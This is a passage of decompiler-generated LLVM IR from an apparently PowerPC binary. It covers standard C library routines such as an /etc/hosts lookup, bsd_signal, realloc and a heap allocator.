  %v1_10014720 = add i32 %v3_10014718, -1
  %v1_10014724 = mul i32 %v1_10014720, 4
  store i32 %v1_10014724, i32* %r11.global-to-local, align 4
  br i1 %v2_1001471c, label %dec_label_pc_100146f0, label %dec_label_pc_1001472c

dec_label_pc_1001472c:                            ; preds = %dec_label_pc_100146f0, %dec_label_pc_1001470c.preheader
  %v3_1001476c59 = phi i32 [ %v3_1001471841, %dec_label_pc_1001470c.preheader ], [ %v3_10014718, %dec_label_pc_100146f0 ]
  %v1_1001475449 = load i32, i32* @r27, align 4
  %v2_1001475450 = icmp sgt i32 %v1_1001475449, 1
  %v0_1001475c53 = load i32, i32* @r1, align 4
  %v2_1001475c54 = add i32 %v0_1001475c53, 4
  br i1 %v2_1001475450, label %dec_label_pc_1001476c, label %dec_label_pc_10014778.backedge

dec_label_pc_10014734:                            ; preds = %dec_label_pc_1001476c
  %v1_10014734 = add i32 %v2_1001475c55, 24
  %v2_10014734 = inttoptr i32 %v1_10014734 to i32*
  %v3_10014734 = load i32, i32* %v2_10014734, align 4
  store i32 %v3_10014734, i32* %r3.global-to-local, align 4
  store i32 268519228, i32* @lr, align 4
  %v1_10014738 = call i32 @__GI_strdup(i32 %v3_10014734)
  store i32 %v1_10014738, i32* %r3.global-to-local, align 4
  %v0_10014740 = load i32, i32* @r29, align 4
  %v1_10014740 = add i32 %v0_10014740, 1
  store i32 %v1_10014740, i32* %r11.global-to-local, align 4
  %v1_10014744 = mul i32 %v0_10014740, 4
  store i32 %v1_10014740, i32* @global_var_1002f0a4.542, align 4
  %v3_10014750 = add i32 %v1_10014744, ptrtoint (i32* @global_var_10033c1c.544 to i32)
  %v4_10014750 = inttoptr i32 %v3_10014750 to i32*
  store i32 %v1_10014738, i32* %v4_10014750, align 4
  %v0_10014754.pre = load i32, i32* @r31, align 4
  %v1_10014754 = load i32, i32* @r27, align 4
  %v2_10014754 = icmp slt i32 %v0_10014754.pre, %v1_10014754
  br i1 %v2_10014754, label %dec_label_pc_10014734.dec_label_pc_1001476c_crit_edge, label %dec_label_pc_10014778.backedge

dec_label_pc_10014734.dec_label_pc_1001476c_crit_edge: ; preds = %dec_label_pc_10014734
  %v0_1001475c = load i32, i32* @r1, align 4
  %v1_10014758 = mul i32 %v0_10014754.pre, 4
  %v2_1001475c = add i32 %v0_1001475c, %v1_10014758
  %v3_1001476c.pre = load i32, i32* @global_var_1002f0a4.542, align 4
  br label %dec_label_pc_1001476c

dec_label_pc_1001476c:                            ; preds = %dec_label_pc_1001472c, %dec_label_pc_10014734.dec_label_pc_1001476c_crit_edge
  %v3_1001476c = phi i32 [ %v3_1001476c.pre, %dec_label_pc_10014734.dec_label_pc_1001476c_crit_edge ], [ %v3_1001476c59, %dec_label_pc_1001472c ]
  %v2_1001475c55 = phi i32 [ %v2_1001475c, %dec_label_pc_10014734.dec_label_pc_1001476c_crit_edge ], [ %v2_1001475c54, %dec_label_pc_1001472c ]
  %tmp37 = icmp slt i32 %v3_1001476c, 4
  br i1 %tmp37, label %dec_label_pc_10014734, label %dec_label_pc_10014778.backedge

dec_label_pc_10014778:                            ; preds = %dec_label_pc_10014778.backedge, %dec_label_pc_10014778.preheader
  %v0_10014784 = phi i32 [ %v0_10014784.pre, %dec_label_pc_10014778.backedge ], [ %v0_1001478416, %dec_label_pc_10014778.preheader ]
  store i32 %v2_10014778, i32* %r3.global-to-local, align 4
  store i32 268519308, i32* @lr, align 4
  %v3_10014788 = call i32 @fgets(i32 %v2_10014778, i32 128, i32 %v0_10014784)
  store i32 %v3_10014788, i32* %r3.global-to-local, align 4
  %v3_1001478c = icmp eq i32 %v3_10014788, 0
  br i1 %v3_1001478c, label %dec_label_pc_1001479c, label %dec_label_pc_10014584.preheader

dec_label_pc_10014584.preheader:                  ; preds = %dec_label_pc_10014778
  store i32 %v2_10014778, i32* %r3.global-to-local, align 4
  %v2_100145843 = load i8, i8* %v1_100145842, align 4
  %v3_100145844 = zext i8 %v2_100145843 to i32
  store i32 %v3_100145844, i32* %r11.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10030000.11 to i32), i32* @r8, align 4
  %v3_1001458c6 = icmp eq i8 %v2_100145843, 0
  %v1_100145908 = mul nuw nsw i32 %v3_100145844, 2
  store i32 %v1_100145908, i32* @r10, align 4
  br i1 %v3_1001458c6, label %dec_label_pc_10014778.backedge, label %dec_label_pc_10014598.lr.ph

dec_label_pc_10014598.lr.ph:                      ; preds = %dec_label_pc_10014584.preheader
  %v3_10014598.pre = load i32, i32* @global_var_1002efac, align 4
  br label %dec_label_pc_10014598

dec_label_pc_1001479c:                            ; preds = %dec_label_pc_10014778
  %v0_1001479c = load i32, i32* @r26, align 4
  store i32 %v0_1001479c, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_100147a4.558 to i32), i32* @lr, align 4
  %v1_100147a0 = inttoptr i32 %v0_1001479c to i16*
  %v2_100147a0 = call i32 @__GI_fclose(i16* %v1_100147a0)
  store i32 %v2_100147a0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100147b4

dec_label_pc_100147a8:                            ; preds = %dec_label_pc_10014564
  %v0_100147a8 = call i32 @__GI___h_errno_location()
  store i32 %v0_100147a8, i32* %r3.global-to-local, align 4
  %v2_100147b0 = inttoptr i32 %v0_100147a8 to i32*
  store i32 3, i32* %v2_100147b0, align 4
  br label %dec_label_pc_100147b4

dec_label_pc_100147b4:                            ; preds = %entry, %dec_label_pc_1001479c, %dec_label_pc_100147a8
  store i32 %v2_10014520, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  store i32 268519360, i32* @lr, align 4
  %v0_100147bc = call i32 @__pthread_cleanup_pop_restore()
  store i32 %v0_100147bc, i32* %r3.global-to-local, align 4
  ret i32 %v0_100147bc

; uselistorder directives
  uselistorder i32 %v3_100145844, { 0, 2, 1 }
  uselistorder i32 %v1_1001472446, { 1, 0 }
  uselistorder i32 %v1_1001472045, { 1, 0 }
  uselistorder i32 %v0_100145cc, { 1, 0 }
  uselistorder i32 %v1_1001461c, { 1, 0 }
  uselistorder i8* %v1_10014614, { 0, 2, 1 }
  uselistorder i8 %v2_100145e4, { 2, 0, 1 }
  uselistorder i32 %v0_100145e0, { 0, 1, 3, 2 }
  uselistorder i32 %v1_10014590, { 1, 0 }
  uselistorder i32 %v3_10014584, { 1, 0, 2 }
  uselistorder i32 %v1_10014580, { 0, 2, 1 }
  uselistorder i32 %v2_10014778, { 1, 3, 2, 0 }
  uselistorder i32 %v2_10014520, { 1, 0, 2 }
  uselistorder i32 %tmp, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 25, 1, 24, 2, 23, 28, 13, 3, 4, 20, 5, 6, 29, 7, 26, 8, 9, 10, 11, 22, 12, 21, 0, 14, 15, 27, 16, 17, 19, 18 }
  uselistorder i32* %r11.global-to-local, { 7, 0, 1, 8, 2, 3, 4, 5, 6 }
  uselistorder i32 ()* @__GI___h_errno_location, { 4, 3, 2, 1, 0 }
  uselistorder i32* @global_var_1002f0a4.542, { 0, 2, 3, 4, 5, 1, 6, 7, 8 }
  uselistorder i32 ptrtoint (i32* @global_var_10033c1c.544 to i32), { 3, 5, 1, 0, 2, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_10033c2c.424 to i32), { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1002eef0.422 to i32), { 1, 0, 7, 3, 8, 12, 2, 9, 13, 4, 10, 14, 6, 5, 11 }
  uselistorder label %dec_label_pc_100147b4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1001476c, { 1, 0 }
  uselistorder label %dec_label_pc_100146f0, { 1, 0 }
  uselistorder label %dec_label_pc_1001470c.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_10014698, { 1, 0 }
  uselistorder label %dec_label_pc_10014654, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1001464c, { 1, 0 }
  uselistorder label %dec_label_pc_10014614, { 2, 0, 1 }
  uselistorder label %dec_label_pc_100145e4, { 1, 0 }
  uselistorder label %dec_label_pc_10014778.backedge, { 4, 3, 2, 1, 7, 6, 5, 0 }
  uselistorder label %dec_label_pc_10014778.preheader, { 1, 0 }
}

define i32 @__get_hosts_byname_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v4_100147d8 = ptrtoint i32* %stack_var_0 to i32
  store i32 %arg6, i32* @r10, align 4
  store i32 %arg5, i32* @r29, align 4
  store i32 268519448, i32* @lr, align 4
  %v9_10014814 = inttoptr i32 %arg3 to i32*
  %v10_10014814 = call i32 @__read_etc_hosts_r(i32 0, i32 %arg1, i32 %arg2, i32 0, i32* %v9_10014814, i32 %arg4, i32 %arg5, i32 %v4_100147d8, i32 %arg7)
  ret i32 %v10_10014814
}

define i32 @__bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-292 = alloca i32, align 4
  %stack_var_-296 = alloca i32, align 4
  %v3_1001482c = icmp eq i32 %arg2, -1
  store i32 %arg1, i32* %r31.global-to-local, align 4
  br i1 %v3_1001482c, label %dec_label_pc_10014858, label %dec_label_pc_10014848

dec_label_pc_10014848:                            ; preds = %entry
  %tmp20 = icmp slt i32 %arg1, 1
  br i1 %tmp20, label %dec_label_pc_10014858, label %dec_label_pc_10014850

dec_label_pc_10014850:                            ; preds = %dec_label_pc_10014848
  %tmp21 = icmp slt i32 %arg1, 65
  br i1 %tmp21, label %dec_label_pc_10014888.lr.ph, label %dec_label_pc_10014858

dec_label_pc_10014858:                            ; preds = %dec_label_pc_10014850, %dec_label_pc_10014848, %entry
  %v0_10014858 = call i32 @__errno_location()
  store i32 -1, i32* %r9.global-to-local, align 4
  %v2_10014864 = inttoptr i32 %v0_10014858 to i32*
  store i32 22, i32* %v2_10014864, align 4
  %v0_100148f8.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_100148f4

dec_label_pc_10014888.lr.ph:                      ; preds = %dec_label_pc_10014850
  %v2_10014878 = ptrtoint i32* %stack_var_-296 to i32
  store i32 %v2_10014878, i32* @r8, align 4
  store i32 0, i32* @r10, align 4
  store i32 %arg2, i32* %stack_var_-296, align 4
  store i32 31, i32* %r11.global-to-local, align 4
  store i32 32, i32* %ctr.global-to-local, align 4
  %v2_1001488822 = add i32 %v2_10014878, 128
  %v3_1001488823 = inttoptr i32 %v2_1001488822 to i32*
  store i32 0, i32* %v3_1001488823, align 4
  %v0_1001488c24 = load i32, i32* %r11.global-to-local, align 4
  %v1_1001488c25 = add i32 %v0_1001488c24, -1
  store i32 %v1_1001488c25, i32* %r11.global-to-local, align 4
  %v1_1001489026 = mul i32 %v1_1001488c25, 4
  %v1_1001489427 = load i32, i32* @r8, align 4
  %v2_1001489428 = add i32 %v1_1001489427, %v1_1001489026
  store i32 %v2_1001489428, i32* %r9.global-to-local, align 4
  %v0_1001489829 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1001489830 = add i32 %v0_1001489829, -1
  store i32 %v1_1001489830, i32* %ctr.global-to-local, align 4
  %v2_1001489831 = icmp eq i32 %v1_1001489830, 0
  br i1 %v2_1001489831, label %dec_label_pc_1001489c, label %dec_label_pc_10014888.dec_label_pc_10014888_crit_edge

dec_label_pc_10014888.dec_label_pc_10014888_crit_edge: ; preds = %dec_label_pc_10014888.lr.ph, %dec_label_pc_10014888.dec_label_pc_10014888_crit_edge
  %v2_1001489432 = phi i32 [ %v2_10014894, %dec_label_pc_10014888.dec_label_pc_10014888_crit_edge ], [ %v2_1001489428, %dec_label_pc_10014888.lr.ph ]
  %v0_10014888.pre = load i32, i32* @r10, align 4
  %v2_10014888 = add i32 %v2_1001489432, 4
  %v3_10014888 = inttoptr i32 %v2_10014888 to i32*
  store i32 %v0_10014888.pre, i32* %v3_10014888, align 4
  %v0_1001488c = load i32, i32* %r11.global-to-local, align 4
  %v1_1001488c = add i32 %v0_1001488c, -1
  store i32 %v1_1001488c, i32* %r11.global-to-local, align 4
  %v1_10014890 = mul i32 %v1_1001488c, 4
  %v1_10014894 = load i32, i32* @r8, align 4
  %v2_10014894 = add i32 %v1_10014894, %v1_10014890
  store i32 %v2_10014894, i32* %r9.global-to-local, align 4
  %v0_10014898 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10014898 = add i32 %v0_10014898, -1
  store i32 %v1_10014898, i32* %ctr.global-to-local, align 4
  %v2_10014898 = icmp eq i32 %v1_10014898, 0
  br i1 %v2_10014898, label %dec_label_pc_1001489c, label %dec_label_pc_10014888.dec_label_pc_10014888_crit_edge

dec_label_pc_1001489c:                            ; preds = %dec_label_pc_10014888.dec_label_pc_10014888_crit_edge, %dec_label_pc_10014888.lr.ph
  %v0_100148a0.pre = load i32, i32* %r31.global-to-local, align 4
  %v2_1001489c = ptrtoint i32* %stack_var_-292 to i32
  store i32 %v2_1001489c, i32* @r3, align 4
  store i32 %v0_100148a0.pre, i32* @r4, align 4
  %v0_100148a4 = call i32 @__sigaddset()
  %v1_100148a8 = icmp slt i32 %v0_100148a4, 0
  br i1 %v1_100148a8, label %dec_label_pc_100148f0, label %dec_label_pc_100148b0

dec_label_pc_100148b0:                            ; preds = %dec_label_pc_1001489c
  %v0_100148b4 = load i32, i32* %r31.global-to-local, align 4
  store i32 %v0_100148b4, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_10033c38.561 to i32), i32* @r3, align 4
  %v0_100148bc = call i32 @__sigismember()
  %v2_100148c8 = ptrtoint i32* %stack_var_-156 to i32
  store i32 268519648, i32* @lr, align 4
  %v4_100148dc = call i32 @__GI_sigaction(i32 %v0_100148b4, i32* nonnull %stack_var_-296, i32 %v2_100148c8)
  %v1_100148e0 = icmp slt i32 %v4_100148dc, 0
  br i1 %v1_100148e0, label %dec_label_pc_100148f0, label %dec_label_pc_100148e8

dec_label_pc_100148e8:                            ; preds = %dec_label_pc_100148b0
  %v3_100148e8 = load i32, i32* %stack_var_-156, align 4
  store i32 %v3_100148e8, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_100148f4

dec_label_pc_100148f0:                            ; preds = %dec_label_pc_100148b0, %dec_label_pc_1001489c
  store i32 -1, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_100148f4

dec_label_pc_100148f4:                            ; preds = %dec_label_pc_100148e8, %dec_label_pc_10014858, %dec_label_pc_100148f0
  %v0_100148f8 = phi i32 [ %v3_100148e8, %dec_label_pc_100148e8 ], [ %v0_100148f8.pre, %dec_label_pc_10014858 ], [ -1, %dec_label_pc_100148f0 ]
  ret i32 %v0_100148f8

; uselistorder directives
  uselistorder i32 %v1_10014898, { 1, 0 }
  uselistorder i32 %v2_10014894, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 0, 1, 2, 5, 3, 4 }
  uselistorder i32* %r11.global-to-local, { 0, 3, 4, 1, 2 }
  uselistorder i32* %ctr.global-to-local, { 0, 3, 4, 1, 2 }
  uselistorder i32 ()* @__sigismember, { 2, 0, 1 }
  uselistorder i32 65, { 1, 2, 6, 8, 9, 7, 4, 5, 3, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_100148f4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10014888.dec_label_pc_10014888_crit_edge, { 1, 0 }
}

define i32 @realloc(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  %v3_1001490c = icmp eq i32 %arg2, 0
  store i32 %arg1, i32* @r28, align 4
  br i1 %v3_1001490c, label %dec_label_pc_10014928, label %dec_label_pc_10014934

dec_label_pc_10014928:                            ; preds = %entry
  store i32 ptrtoint ([3 x i8]* @global_var_1001492c.562 to i32), i32* @lr, align 4
  %v0_10014928 = call i32 @free()
  br label %dec_label_pc_10014940

dec_label_pc_10014934:                            ; preds = %entry
  %v3_10014934 = icmp eq i32 %arg1, 0
  br i1 %v3_10014934, label %dec_label_pc_10014940, label %dec_label_pc_1001494c

dec_label_pc_10014940:                            ; preds = %dec_label_pc_10014934, %dec_label_pc_10014928
  %storemerge = phi i32 [ 0, %dec_label_pc_10014928 ], [ %arg2, %dec_label_pc_10014934 ]
  store i32 %storemerge, i32* @r3, align 4
  store i32 268519748, i32* @lr, align 4
  %v0_10014940 = call i32 @malloc()
  store i32 %v0_10014940, i32* @r28, align 4
  br label %dec_label_pc_10014a24

dec_label_pc_1001494c:                            ; preds = %dec_label_pc_10014934
  %v1_1001494c = add i32 %arg2, 7
  %v1_10014950 = add i32 %arg1, -4
  store i32 %v1_10014950, i32* @r27, align 4
  %v1_10014954 = call i32 @__asm_rlwinm(i32 %v1_1001494c, i32 0, i32 0, i32 29)
  store i32 %v1_10014954, i32* @r31, align 4
  %v2_10014958 = inttoptr i32 %v1_10014950 to i32*
  %v3_10014958 = load i32, i32* %v2_10014958, align 4
  store i32 %v3_10014958, i32* @r30, align 4
  %v2_1001495c = icmp ugt i32 %v1_10014954, 11
  br i1 %v2_1001495c, label %dec_label_pc_10014968, label %dec_label_pc_10014964

dec_label_pc_10014964:                            ; preds = %dec_label_pc_1001494c
  store i32 12, i32* @r31, align 4
  br label %dec_label_pc_10014968

dec_label_pc_10014968:                            ; preds = %dec_label_pc_1001494c, %dec_label_pc_10014964
  %v0_100149e8 = phi i32 [ %v1_10014954, %dec_label_pc_1001494c ], [ 12, %dec_label_pc_10014964 ]
  %v3_10014968 = icmp ugt i32 %v0_100149e8, %v3_10014958
  br i1 %v3_10014968, label %dec_label_pc_10014970, label %dec_label_pc_100149e8

dec_label_pc_10014970:                            ; preds = %dec_label_pc_10014968
  store i32 ptrtoint (i32* @global_var_1003383c.206 to i32), i32* @r29, align 4
  store i32 268519808, i32* @lr, align 4
  %v1_1001497c = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_1003383c.206 to i32))
  %v0_10014984 = load i32, i32* @r27, align 4
  %v1_10014984 = load i32, i32* @r30, align 4
  %v2_10014984 = add i32 %v1_10014984, %v0_10014984
  %v1_10014988 = load i32, i32* @r31, align 4
  %v2_10014988 = sub i32 %v1_10014988, %v1_10014984
  %v4_10014990 = call i32 @__heap_alloc_at(i32* nonnull @global_var_1002efa0, i32 %v2_10014984, i32 %v2_10014988)
  store i32 %v4_10014990, i32* @r27, align 4
  %v0_10014998 = load i32, i32* @r29, align 4
  store i32 %v0_10014998, i32* @r3, align 4
  store i32 268519840, i32* @lr, align 4
  %v0_1001499c = call i32 @pthread_mutex_unlock()
  %v0_100149a0 = load i32, i32* @r27, align 4
  %v3_100149a0 = icmp eq i32 %v0_100149a0, 0
  br i1 %v3_100149a0, label %dec_label_pc_100149b4, label %dec_label_pc_100149a8

dec_label_pc_100149a8:                            ; preds = %dec_label_pc_10014970
  %v0_100149a8 = load i32, i32* @r30, align 4
  %v2_100149a8 = add i32 %v0_100149a8, %v0_100149a0
  %v1_100149ac = load i32, i32* @r28, align 4
  %v2_100149ac = add i32 %v1_100149ac, -4
  %v3_100149ac = inttoptr i32 %v2_100149ac to i32*
  store i32 %v2_100149a8, i32* %v3_100149ac, align 4
  br label %dec_label_pc_10014a24

dec_label_pc_100149b4:                            ; preds = %dec_label_pc_10014970
  %v0_100149b4 = load i32, i32* @r31, align 4
  %v1_100149b4 = add i32 %v0_100149b4, -4
  store i32 %v1_100149b4, i32* @r3, align 4
  store i32 268519868, i32* @lr, align 4
  %v0_100149b8 = call i32 @malloc()
  store i32 %v0_100149b8, i32* @r3, align 4
  store i32 %v0_100149b8, i32* @r31, align 4
  %v3_100149bc = icmp eq i32 %v0_100149b8, 0
  br i1 %v3_100149bc, label %dec_label_pc_100149c4, label %dec_label_pc_100149cc

dec_label_pc_100149c4:                            ; preds = %dec_label_pc_100149b4
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_10014a24

dec_label_pc_100149cc:                            ; preds = %dec_label_pc_100149b4
  %v0_100149cc = load i32, i32* @r28, align 4
  store i32 %v0_100149cc, i32* @r4, align 4
  %v0_100149d0 = load i32, i32* @r30, align 4
  %v1_100149d0 = add i32 %v0_100149d0, -4
  store i32 %v1_100149d0, i32* @r5, align 4
  store i32 268519896, i32* @lr, align 4
  %v0_100149d4 = call i32 @memcpy()
  %v0_100149d8 = load i32, i32* @r28, align 4
  store i32 %v0_100149d8, i32* @r3, align 4
  store i32 268519904, i32* @lr, align 4
  %v0_100149dc = call i32 @free()
  %v0_100149e0 = load i32, i32* @r31, align 4
  store i32 %v0_100149e0, i32* @r28, align 4
  br label %dec_label_pc_10014a24

dec_label_pc_100149e8:                            ; preds = %dec_label_pc_10014968
  %v1_100149e8 = add i32 %v0_100149e8, 28
  %v3_100149ec = icmp ugt i32 %v1_100149e8, %v3_10014958
  br i1 %v3_100149ec, label %dec_label_pc_10014a24, label %dec_label_pc_100149f4

dec_label_pc_100149f4:                            ; preds = %dec_label_pc_100149e8
  store i32 ptrtoint (i32* @global_var_1003383c.206 to i32), i32* @r29, align 4
  store i32 268519940, i32* @lr, align 4
  %v1_10014a00 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_1003383c.206 to i32))
  %v0_10014a08 = load i32, i32* @r27, align 4
  %v1_10014a08 = load i32, i32* @r31, align 4
  %v2_10014a08 = add i32 %v1_10014a08, %v0_10014a08
  %v1_10014a0c = load i32, i32* @r30, align 4
  %v2_10014a0c = sub i32 %v1_10014a0c, %v1_10014a08
  store i32 268519960, i32* @lr, align 4
  %v4_10014a14 = call i32 @__heap_free(i32* nonnull @global_var_1002efa0, i32 %v2_10014a08, i32 %v2_10014a0c)
  %v0_10014a18 = load i32, i32* @r29, align 4
  store i32 %v0_10014a18, i32* @r3, align 4
  store i32 268519968, i32* @lr, align 4
  %v0_10014a1c = call i32 @pthread_mutex_unlock()
  %v0_10014a20 = load i32, i32* @r31, align 4
  %v1_10014a20 = load i32, i32* @r28, align 4
  %v2_10014a20 = add i32 %v1_10014a20, -4
  %v3_10014a20 = inttoptr i32 %v2_10014a20 to i32*
  store i32 %v0_10014a20, i32* %v3_10014a20, align 4
  br label %dec_label_pc_10014a24

dec_label_pc_10014a24:                            ; preds = %dec_label_pc_100149e8, %dec_label_pc_100149cc, %dec_label_pc_100149c4, %dec_label_pc_100149a8, %dec_label_pc_10014940, %dec_label_pc_100149f4
  %v0_10014a28 = load i32, i32* @r28, align 4
  ret i32 %v0_10014a28

; uselistorder directives
  uselistorder i32 %v1_10014a08, { 1, 0 }
  uselistorder i32 %v1_10014984, { 1, 0 }
  uselistorder i32 (i32*, i32, i32)* @__heap_free, { 0, 2, 1 }
  uselistorder i32* @global_var_1002efa0, { 0, 1, 3, 2, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_1003383c.206 to i32), { 0, 6, 1, 7, 8, 2, 3, 9, 4, 10, 5, 11 }
  uselistorder i32 %arg1, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_10014a24, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_10014968, { 1, 0 }
}

define i32 @__heap_alloc_at(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %v2_10014a3c = load i32, i32* %arg1, align 4
  store i32 %v2_10014a3c, i32* @r11, align 4
  store i32 %tmp, i32* @r8, align 4
  %v1_10014a44 = add i32 %arg3, 3
  %v3_10014ac83 = icmp eq i32 %v2_10014a3c, 0
  br i1 %v3_10014ac83, label %dec_label_pc_10014ad0, label %dec_label_pc_10014a4c

dec_label_pc_10014a4c:                            ; preds = %entry, %dec_label_pc_10014ac4
  %v0_10014ac4 = phi i32 [ %v3_10014ac4, %dec_label_pc_10014ac4 ], [ %v2_10014a3c, %entry ]
  %v1_10014a4c = inttoptr i32 %v0_10014ac4 to i32*
  %v2_10014a4c = load i32, i32* %v1_10014a4c, align 4
  %v2_10014a50 = sub i32 %v0_10014ac4, %v2_10014a4c
  %v1_10014a54 = add i32 %v2_10014a50, 12
  store i32 %v1_10014a54, i32* @r9, align 4
  %v3_10014a58 = icmp ugt i32 %v1_10014a54, %arg2
  br i1 %v3_10014a58, label %dec_label_pc_10014ac4, label %dec_label_pc_10014a60

dec_label_pc_10014a60:                            ; preds = %dec_label_pc_10014a4c
  %v4_10014a58 = icmp eq i32 %v1_10014a54, %arg2
  br i1 %v4_10014a58, label %dec_label_pc_10014a68, label %dec_label_pc_10014ad0

dec_label_pc_10014a68:                            ; preds = %dec_label_pc_10014a60
  %v1_10014a68 = call i32 @__asm_rlwinm(i32 %v1_10014a44, i32 0, i32 0, i32 29)
  %v2_10014a6c = icmp ult i32 %v2_10014a4c, %v1_10014a68
  br i1 %v2_10014a6c, label %dec_label_pc_10014ad0, label %dec_label_pc_10014a74

dec_label_pc_10014a74:                            ; preds = %dec_label_pc_10014a68
  %v1_10014a74 = add i32 %v1_10014a68, 44
  %v2_10014a78 = icmp ult i32 %v2_10014a4c, %v1_10014a74
  br i1 %v2_10014a78, label %dec_label_pc_10014a80, label %dec_label_pc_10014ab4

dec_label_pc_10014a80:                            ; preds = %dec_label_pc_10014a74
  %v0_10014a80 = load i32, i32* @r11, align 4
  %v1_10014a80 = add i32 %v0_10014a80, 4
  %v2_10014a80 = inttoptr i32 %v1_10014a80 to i32*
  %v3_10014a80 = load i32, i32* %v2_10014a80, align 4
  %v3_10014a84 = icmp eq i32 %v3_10014a80, 0
  br i1 %v3_10014a84, label %dec_label_pc_10014a94, label %dec_label_pc_10014a8c

dec_label_pc_10014a8c:                            ; preds = %dec_label_pc_10014a80
  %v1_10014a8c = add i32 %v0_10014a80, 8
  %v2_10014a8c = inttoptr i32 %v1_10014a8c to i32*
  %v3_10014a8c = load i32, i32* %v2_10014a8c, align 4
  %v2_10014a90 = add i32 %v3_10014a80, 8
  %v3_10014a90 = inttoptr i32 %v2_10014a90 to i32*
  store i32 %v3_10014a8c, i32* %v3_10014a90, align 4
  %v0_10014a94.pre = load i32, i32* @r11, align 4
  br label %dec_label_pc_10014a94

dec_label_pc_10014a94:                            ; preds = %dec_label_pc_10014a80, %dec_label_pc_10014a8c
  %v0_10014a94 = phi i32 [ %v0_10014a80, %dec_label_pc_10014a80 ], [ %v0_10014a94.pre, %dec_label_pc_10014a8c ]
  %v1_10014a94 = add i32 %v0_10014a94, 8
  %v2_10014a94 = inttoptr i32 %v1_10014a94 to i32*
  %v3_10014a94 = load i32, i32* %v2_10014a94, align 4
  store i32 %v3_10014a94, i32* @r10, align 4
  %v1_10014a98 = add i32 %v0_10014a94, 4
  %v2_10014a98 = inttoptr i32 %v1_10014a98 to i32*
  %v3_10014a98 = load i32, i32* %v2_10014a98, align 4
  store i32 %v3_10014a98, i32* @r9, align 4
  %v3_10014a9c = icmp eq i32 %v3_10014a94, 0
  br i1 %v3_10014a9c, label %dec_label_pc_10014aac, label %dec_label_pc_10014aa4

dec_label_pc_10014aa4:                            ; preds = %dec_label_pc_10014a94
  %v2_10014aa4 = add i32 %v3_10014a94, 4
  %v3_10014aa4 = inttoptr i32 %v2_10014aa4 to i32*
  store i32 %v3_10014a98, i32* %v3_10014aa4, align 4
  ret i32 %v2_10014a4c

dec_label_pc_10014aac:                            ; preds = %dec_label_pc_10014a94
  %v1_10014aac = load i32, i32* @r8, align 4
  %v2_10014aac = inttoptr i32 %v1_10014aac to i32*
  store i32 %v3_10014a98, i32* %v2_10014aac, align 4
  ret i32 %v2_10014a4c

dec_label_pc_10014ab4:                            ; preds = %dec_label_pc_10014a74
  %v2_10014ab4 = sub i32 %v2_10014a4c, %v1_10014a68
  %v1_10014abc = load i32, i32* @r11, align 4
  %v2_10014abc = inttoptr i32 %v1_10014abc to i32*
  store i32 %v2_10014ab4, i32* %v2_10014abc, align 4
  ret i32 %v1_10014a68

dec_label_pc_10014ac4:                            ; preds = %dec_label_pc_10014a4c
  %v1_10014ac4 = add i32 %v0_10014ac4, 4
  %v2_10014ac4 = inttoptr i32 %v1_10014ac4 to i32*
  %v3_10014ac4 = load i32, i32* %v2_10014ac4, align 4
  store i32 %v3_10014ac4, i32* @r11, align 4
  %v3_10014ac8 = icmp eq i32 %v3_10014ac4, 0
  br i1 %v3_10014ac8, label %dec_label_pc_10014ac8.dec_label_pc_10014ad0.loopexit_crit_edge, label %dec_label_pc_10014a4c

dec_label_pc_10014ac8.dec_label_pc_10014ad0.loopexit_crit_edge: ; preds = %dec_label_pc_10014ac4
  br label %dec_label_pc_10014ad0

dec_label_pc_10014ad0:                            ; preds = %entry, %dec_label_pc_10014ac8.dec_label_pc_10014ad0.loopexit_crit_edge, %dec_label_pc_10014a60, %dec_label_pc_10014a68
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_10014ac4, { 1, 2, 0 }
  uselistorder i32 %v0_10014a94, { 1, 0 }
  uselistorder i32 %v1_10014a68, { 1, 0, 2, 3 }
  uselistorder i32 %v2_10014a4c, { 0, 2, 3, 1, 4, 5 }
  uselistorder i32 %v0_10014ac4, { 0, 2, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_10014ad0, { 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_10014a94, { 1, 0 }
  uselistorder label %dec_label_pc_10014a4c, { 1, 0 }
}

define i32 @abort(i32 %arg1) local_unnamed_addr {
dec_label_pc_10014b0c.lr.ph:
  %ctr.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
